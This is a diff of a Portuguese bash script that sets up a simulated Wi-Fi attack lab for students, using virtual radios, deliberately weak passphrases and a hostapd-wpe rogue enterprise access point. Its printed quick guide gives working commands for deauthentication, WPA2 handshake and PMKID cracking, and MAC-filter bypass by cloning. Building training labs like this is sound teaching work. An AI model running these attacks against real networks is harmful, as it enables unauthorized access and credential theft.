@@ -15,15 +15,15 @@
 #
 #  Herdado da v2:
 #   - Rede OPEN com servidor HTTP + bot de login em texto claro.
-#   - WPS e WPA2 no host.
+#   - WPA2-PSK no host.
 #
-#  (WEP foi removido: dispensa o container Docker. O lab roda só com
-#   hostapd/wpa_supplicant no host.)
+#  (WEP e WPS foram removidos. O lab roda só com hostapd/wpa_supplicant
+#   no host, sem container Docker.)
 #
 #  MAPA DE REDES
 #  -------------
-#   2.4GHz:  XPSEC-WPS (ch6)             XPSEC-WPA2 (ch11)
-#            XPSEC-OPEN (ch3)            XPSEC-MACACL (ch9, filtro de MAC)
+#   2.4GHz:  XPSEC-WPA2 (ch11)          XPSEC-OPEN (ch3)
+#            XPSEC-MACACL (ch9, filtro de MAC)
 #   5GHz:    XPSEC-PMKID (ch36, clientless)
 #            XPSEC-CORP  (ch149, WPA2-Enterprise / hostapd-wpe)
 #
@@ -38,7 +38,7 @@
 set -u
 
 LAB_DIR="/tmp/xpsec-wifi-lab"
-NUM_RADIOS=16
+NUM_RADIOS=12
 
 LOG()  { echo -e "\e[1;36m[xpsec]\e[0m $*"; }
 WARN() { echo -e "\e[1;33m[aviso]\e[0m $*"; }
@@ -46,7 +46,6 @@ ERR()  { echo -e "\e[1;31m[erro]\e[0m $*" >&2; }
 OK()   { echo -e "\e[1;32m[ ok ]\e[0m $*"; }
 
 # ---- Credenciais / SSIDs do lab -------------------------------------------
-SSID_WPS="XPSEC-WPS";    WPS_PSK="SenhaWPS2026"; WPS_PIN="12345670"
 SSID_WPA2="XPSEC-WPA2";  WPA2_PSK="verao2024"          # fraca de propósito
 SSID_OPEN="XPSEC-OPEN"                                   # sem cripto
 SSID_PMKID="XPSEC-PMKID"; PMKID_PSK="familia10"         # 5GHz, clientless
@@ -60,11 +59,11 @@ OPEN_NET="10.0.4";   OPEN_AP_IP="${OPEN_NET}.1"
 MACACL_NET="10.0.9"; MACACL_AP_IP="${MACACL_NET}.1"
 
 # Interfaces no HOST (hwsim).
-AP_WPS="wlan_wps"; AP_WPA2="wlan_wpa2"; AP_OPEN="wlan_open"
+AP_WPA2="wlan_wpa2"; AP_OPEN="wlan_open"
 AP_PMKID="wlan_pmkid"; AP_CORP="wlan_corp"; AP_MACACL="wlan_macacl"
-STA_WPS="sta_wps"; STA_WPA2="sta_wpa2"; STA_OPEN="sta_open"; STA_CORP="sta_corp"
+STA_WPA2="sta_wpa2"; STA_OPEN="sta_open"; STA_CORP="sta_corp"
 STA_MACACL="sta_macacl"
-ATK_WPS="atk_wps"  # rádio managed livre p/ o registrar WPS simulado atacar
+ATK="atk0"         # rádio managed livre p/ o aluno atacar (ex.: clonar MAC)
 MON_IF="mon_lab"   # interface livre p/ o aluno colocar em monitor
 
 # ===========================================================================
@@ -136,7 +135,7 @@ load_hwsim() {
   iw reg set US 2>/dev/null          # libera canais 5GHz (UNII-1/UNII-3)
   sleep 1
   mapfile -t RAW < <(iw dev | awk '/Interface/{print $2}' | grep -E '^wlan[0-9]+$' | sort -V)
-  ((${#RAW[@]} >= 13)) || { ERR "Esperava >=13 ifaces hwsim, achei ${#RAW[@]}. Outro adaptador WiFi presente?"; exit 1; }
+  ((${#RAW[@]} >= 11)) || { ERR "Esperava >=11 ifaces hwsim, achei ${#RAW[@]}. Outro adaptador WiFi presente?"; exit 1; }
   OK "Rádios: ${#RAW[@]} (${RAW[*]})"
 }
 
@@ -150,47 +149,24 @@ rename_if() {  # $1=origem wlanX  $2=novo nome
 
 assign_host_ifaces() {
   LOG "Nomeando interfaces do host..."
-  rename_if "${RAW[0]}"  "$AP_WPS"
-  rename_if "${RAW[1]}"  "$AP_WPA2"
-  rename_if "${RAW[2]}"  "$AP_OPEN"
-  rename_if "${RAW[3]}"  "$AP_PMKID"
-  rename_if "${RAW[4]}"  "$AP_CORP"
-  rename_if "${RAW[5]}"  "$STA_WPS"
-  rename_if "${RAW[6]}"  "$STA_WPA2"
-  rename_if "${RAW[7]}"  "$STA_OPEN"
-  rename_if "${RAW[8]}"  "$STA_CORP"
-  rename_if "${RAW[9]}"  "$AP_MACACL"
-  rename_if "${RAW[10]}" "$STA_MACACL"
-  rename_if "${RAW[11]}" "$ATK_WPS"
-  rename_if "${RAW[12]}" "$MON_IF"
+  rename_if "${RAW[0]}"  "$AP_WPA2"
+  rename_if "${RAW[1]}"  "$AP_OPEN"
+  rename_if "${RAW[2]}"  "$AP_PMKID"
+  rename_if "${RAW[3]}"  "$AP_CORP"
+  rename_if "${RAW[4]}"  "$AP_MACACL"
+  rename_if "${RAW[5]}"  "$STA_WPA2"
+  rename_if "${RAW[6]}"  "$STA_OPEN"
+  rename_if "${RAW[7]}"  "$STA_CORP"
+  rename_if "${RAW[8]}"  "$STA_MACACL"
+  rename_if "${RAW[9]}"  "$ATK"
+  rename_if "${RAW[10]}" "$MON_IF"
 }
 
 # ===========================================================================
-#  APs 2.4GHz no host: WPS, WPA2, OPEN
+#  APs 2.4GHz no host: WPA2, OPEN
 # ===========================================================================
 start_host_aps() {
   mkdir -p "$LAB_DIR"
-  cat > "$LAB_DIR/ap_wps.conf" <<EOF
-interface=${AP_WPS}
-driver=nl80211
-ssid=${SSID_WPS}
-hw_mode=g
-channel=6
-wpa=2
-wpa_key_mgmt=WPA-PSK
-rsn_pairwise=CCMP
-wpa_passphrase=${WPS_PSK}
-wps_state=2
-ap_setup_locked=0
-config_methods=label display push_button keypad
-device_name=XPSEC-LAB-WPS
-manufacturer=XPSecAcademy
-model_name=LabAP
-model_number=1
-serial_number=0001
-device_type=6-0050F204-1
-ap_pin=${WPS_PIN}
-EOF
   cat > "$LAB_DIR/ap_wpa2.conf" <<EOF
 interface=${AP_WPA2}
 driver=nl80211
@@ -211,8 +187,7 @@ channel=3
 auth_algs=1
 EOF
 
-  LOG "Subindo APs 2.4GHz (WPS/WPA2/OPEN)..."
-  hostapd -B -t -f "$LAB_DIR/hostapd_wps.log"  "$LAB_DIR/ap_wps.conf"  && OK "AP $SSID_WPS"  || ERR "WPS falhou"
+  LOG "Subindo APs 2.4GHz (WPA2/OPEN)..."
   hostapd -B -t -f "$LAB_DIR/hostapd_wpa2.log" "$LAB_DIR/ap_wpa2.conf" && OK "AP $SSID_WPA2" || ERR "WPA2 falhou"
   hostapd -B -t -f "$LAB_DIR/hostapd_open.log" "$LAB_DIR/ap_open.conf" && OK "AP $SSID_OPEN" || ERR "OPEN falhou"
   sleep 2
@@ -372,11 +347,11 @@ EOF
 }
 
 # ===========================================================================
-#  Clientes: WPS / WPA2 (handshake) + vítima Enterprise (MSCHAPv2)
+#  Clientes: WPA2 (handshake) + vítima Enterprise (MSCHAPv2)
 # ===========================================================================
 start_host_clients() {
-  LOG "Clientes WPS/WPA2 (geram handshake)..."
-  for pair in "$STA_WPS|$SSID_WPS|$WPS_PSK" "$STA_WPA2|$SSID_WPA2|$WPA2_PSK"; do
+  LOG "Cliente WPA2 (gera handshake)..."
+  for pair in "$STA_WPA2|$SSID_WPA2|$WPA2_PSK"; do
     IFS='|' read -r ifc ssid psk <<< "$pair"
     cat > "$LAB_DIR/${ifc}.conf" <<EOF
 ctrl_interface=/run/wpa_${ifc}
@@ -391,12 +366,10 @@ EOF
   done
 }
 
+MACACL_NS="xpsec_macacl"   # netns do cliente autorizado
+
 start_macacl_client() {
-  LOG "Cliente autorizado do filtro de MAC (clona $MACACL_ALLOWED e gera tráfego)..."
-  ip link set "$STA_MACACL" down 2>/dev/null
-  ip link set "$STA_MACACL" address "$MACACL_ALLOWED" 2>/dev/null \
-    || WARN "  não fixei o MAC $MACACL_ALLOWED em $STA_MACACL"
-  ip link set "$STA_MACACL" up 2>/dev/null
+  LOG "Cliente autorizado do filtro de MAC (clona $MACACL_ALLOWED e gera tráfego REAL no ar)..."
   cat > "$LAB_DIR/sta_macacl.conf" <<EOF
 ctrl_interface=/run/wpa_macacl
 network={
@@ -404,14 +377,45 @@ network={
     key_mgmt=NONE
 }
 EOF
+
+  # Motivo do netns: se o cliente e o AP ficam no MESMO namespace, o ping ao
+  # IP do AP é entregue por loopback (local) e NÃO passa pelo rádio -> o
+  # monitor não vê o STATION. Num netns separado, o tráfego é obrigado a sair
+  # pelo rádio virtual; como o meio do hwsim é global, o mon_lab captura tudo.
+  local phy; phy=$(phy_of "$STA_MACACL")
+  if [[ -n "$phy" ]] && ip netns add "$MACACL_NS" 2>/dev/null; then
+    ip link set "$STA_MACACL" down 2>/dev/null
+    if iw phy "$phy" set netns name "$MACACL_NS" 2>/dev/null; then
+      ip netns exec "$MACACL_NS" ip link set lo up 2>/dev/null
+      ip netns exec "$MACACL_NS" ip link set "$STA_MACACL" address "$MACACL_ALLOWED" 2>/dev/null
+      ip netns exec "$MACACL_NS" ip link set "$STA_MACACL" up 2>/dev/null
+      ip netns exec "$MACACL_NS" wpa_supplicant -B -i "$STA_MACACL" \
+        -c "$LAB_DIR/sta_macacl.conf" -f "$LAB_DIR/sta_macacl.log" 2>/dev/null
+      sleep 3
+      ip netns exec "$MACACL_NS" ip addr add "${MACACL_NET}.60/24" dev "$STA_MACACL" 2>/dev/null
+      # ping ao AP: agora atravessa o rádio (ARP + ICMP visíveis no monitor)
+      ip netns exec "$MACACL_NS" bash -c \
+        "while true; do ping -c 1 -W 1 ${MACACL_AP_IP} >/dev/null 2>&1; sleep 1; done" &
+      echo $! > "$LAB_DIR/macacl_traffic.pid"
+      OK "  Cliente autorizado associado a $SSID_MACACL (netns $MACACL_NS, MAC $MACACL_ALLOWED)"
+      OK "  Gerando tráfego no ar -> aparece como STATION no airodump (canal 9)."
+      return 0
+    else
+      WARN "  Falha ao mover o rádio p/ o netns; usando modo simples (pode não gerar data frames)."
+      ip netns del "$MACACL_NS" 2>/dev/null
+    fi
+  else
+    WARN "  Sem netns disponível; usando modo simples."
+  fi
+
+  # Fallback (sem netns): associa no namespace raiz. O STATION aparece ao
+  # associar, mas sem data frames contínuos.
+  ip link set "$STA_MACACL" down 2>/dev/null
+  ip link set "$STA_MACACL" address "$MACACL_ALLOWED" 2>/dev/null
+  ip link set "$STA_MACACL" up 2>/dev/null
   wpa_supplicant -B -i "$STA_MACACL" -c "$LAB_DIR/sta_macacl.conf" -f "$LAB_DIR/sta_macacl.log" 2>/dev/null \
     && OK "  Cliente autorizado associado a $SSID_MACACL" \
     || WARN "  Cliente autorizado não associou (ver $LAB_DIR/sta_macacl.log)"
-  sleep 2
-  ip addr add "${MACACL_NET}.60/24" dev "$STA_MACACL" 2>/dev/null
-  # tráfego real p/ o MAC autorizado aparecer nos data frames da captura
-  ( while true; do ping -c 1 "$MACACL_AP_IP" >/dev/null 2>&1; sleep 1; done ) >/dev/null 2>&1 &
-  echo $! > "$LAB_DIR/macacl_traffic.pid"
 }
 
 start_corp_victim() {
@@ -446,6 +450,11 @@ lab_down() {
   pkill -f "open_server.py" 2>/dev/null
   pkill -x hostapd-wpe 2>/dev/null
   pkill -f "dnsmasq.*${AP_OPEN}" 2>/dev/null
+  # netns do cliente MACACL: mata processos dentro dele e remove
+  if ip netns list 2>/dev/null | grep -q "${MACACL_NS:-xpsec_macacl}"; then
+    ip netns pids "${MACACL_NS:-xpsec_macacl}" 2>/dev/null | xargs -r kill 2>/dev/null
+    ip netns del "${MACACL_NS:-xpsec_macacl}" 2>/dev/null && OK "netns do MACACL removido."
+  fi
   sleep 1
   modprobe -r mac80211_hwsim 2>/dev/null && OK "mac80211_hwsim removido." \
     || WARN "Não removi mac80211_hwsim (ainda em uso). Rode --down de novo."
@@ -456,6 +465,13 @@ lab_down() {
 lab_status() {
   LOG "Interfaces 802.11:"; iw dev 2>/dev/null | awk '/Interface/{print "  - "$2}'
   echo; LOG "APs (hostapd/hostapd-wpe no host):"; pgrep -af 'hostapd' | grep -E "$LAB_DIR" || echo "  (nenhum)"
+  echo; LOG "Cliente MACACL (netns ${MACACL_NS:-xpsec_macacl}):"
+  if ip netns list 2>/dev/null | grep -q "${MACACL_NS:-xpsec_macacl}"; then
+    ip netns exec "${MACACL_NS:-xpsec_macacl}" iw dev "$STA_MACACL" link 2>/dev/null \
+      | awk '/Connected|SSID/{print "  "$0}' || echo "  (no netns, sem link)"
+  else
+    echo "  (netns ausente)"
+  fi
 }
 
 # ===========================================================================
@@ -469,15 +485,14 @@ $(echo -e '\e[1;32m')===========================================================
 $(echo -e '\e[1;32m')==================================================================$(echo -e '\e[0m')
 
   2.4GHz
-   1) $SSID_WPS    ch 6   WPA2 + WPS  (PIN AP: $WPS_PIN)
-   2) $SSID_WPA2   ch 11  WPA2-PSK fraca  (senha: $WPA2_PSK)
-   3) $SSID_OPEN   ch 3   ABERTA + bot HTTP (user=funcionario / pass=Intranet@2026)
-   4) $SSID_MACACL ch 9   ABERTA + filtro de MAC (autorizado: $MACACL_ALLOWED)
+   1) $SSID_WPA2   ch 11  WPA2-PSK fraca  (senha: $WPA2_PSK)
+   2) $SSID_OPEN   ch 3   ABERTA + bot HTTP (user=funcionario / pass=Intranet@2026)
+   3) $SSID_MACACL ch 9   ABERTA + filtro de MAC (autorizado: $MACACL_ALLOWED)
   5GHz
-   5) $SSID_PMKID  ch 36  WPA2-PSK CLIENTLESS p/ PMKID  (senha: $PMKID_PSK)
-   6) $SSID_CORP   ch 149 WPA2-Enterprise via hostapd-wpe (vítima: $CORP_IDENTITY)
+   4) $SSID_PMKID  ch 36  WPA2-PSK CLIENTLESS p/ PMKID  (senha: $PMKID_PSK)
+   5) $SSID_CORP   ch 149 WPA2-Enterprise via hostapd-wpe (vítima: $CORP_IDENTITY)
 
-  Interface p/ o aluno atacar (monitor):  $MON_IF
+  Interfaces p/ o aluno: monitor=$MON_IF  |  atacante (managed)=$ATK
   Configs/logs:  $LAB_DIR
 
   ROTEIRO RÁPIDO
@@ -495,11 +510,6 @@ $(echo -e '\e[1;32m')===========================================================
   sudo aireplay-ng -0 3 -a <BSSID_WPA2> $MON_IF
   printf '123456\\nverao2024\\nadmin123\\n' > /tmp/wl.txt ; aircrack-ng -w /tmp/wl.txt /tmp/wpa2-01.cap
 
-  # WPS (2.4): registrar simulado (completa no hwsim, ao contrário do Reaver)
-  sudo wash -i $MON_IF                                   # enumera APs com WPS
-  sudo ./xpsec-wps-registrar.sh --pull                  # PIN conhecido -> PSK
-  sudo ./xpsec-wps-registrar.sh --brute                 # adivinhação online (janela p/ aula)
-
   # PMKID (5GHz): SEM cliente, SEM deauth
   sudo hcxdumptool -i $MON_IF -w /tmp/pmkid.pcapng --rds=1
   hcxpcapngtool -o /tmp/pmkid.22000 /tmp/pmkid.pcapng
@@ -512,10 +522,11 @@ $(echo -e '\e[1;32m')===========================================================
 
   # MAC filter bypass (2.4, ch9): descubra o MAC autorizado e clone-o
   sudo airodump-ng -c 9 --bssid <BSSID_MACACL> $MON_IF   # veja o STATION autorizado
-  #   tente associar com SEU mac -> recusado; agora clone o autorizado:
-  sudo ip link set $MON_IF down            # (use uma iface em managed, p.ex. sta_wps livre)
-  sudo macchanger -m $MACACL_ALLOWED sta_wps
-  #   associe à XPSEC-MACACL com o MAC clonado -> filtro furado
+  #   tente associar com SEU mac -> recusado; agora clone o autorizado em $ATK:
+  sudo ip link set $ATK down
+  sudo macchanger -m $MACACL_ALLOWED $ATK
+  sudo ip link set $ATK up
+  #   associe à XPSEC-MACACL (OPEN) com o MAC clonado -> filtro furado
 
   DERRUBAR TUDO:  sudo $0 --down
 
